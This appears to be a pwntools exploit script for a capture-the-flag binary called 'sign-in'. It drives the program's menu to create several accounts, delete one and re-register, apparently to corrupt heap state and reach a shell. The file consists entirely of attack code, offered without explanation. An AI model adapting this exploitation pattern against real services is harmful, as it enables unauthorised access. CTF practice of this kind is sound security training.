from pwn import *
from icecream import ic

elf = exe = ELF("./sign-in")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def signup(username, password):
    sla(b">", b"1")
    sa(b"username: ", username)
    sa(b"password: ", password)

def signin(username, password):
    sla(b">", b"2")
    sa(b"username: ", username)
    sa(b"password: ", password)

def removeacc():
    sla(b">", b"3")

def getshell():
    sla(b">", b"4")

for i in range(9):
    signup(f'user123{i}'.encode(), b'pass1234')
    # signin(f'user123{i}'.encode(), b'pass1234')


signin(b'user1230', b'pass1234')
removeacc()

signup(b'user1239', b'pass1234')
signin(b'user1239', b'pass1234')

io.interactive()
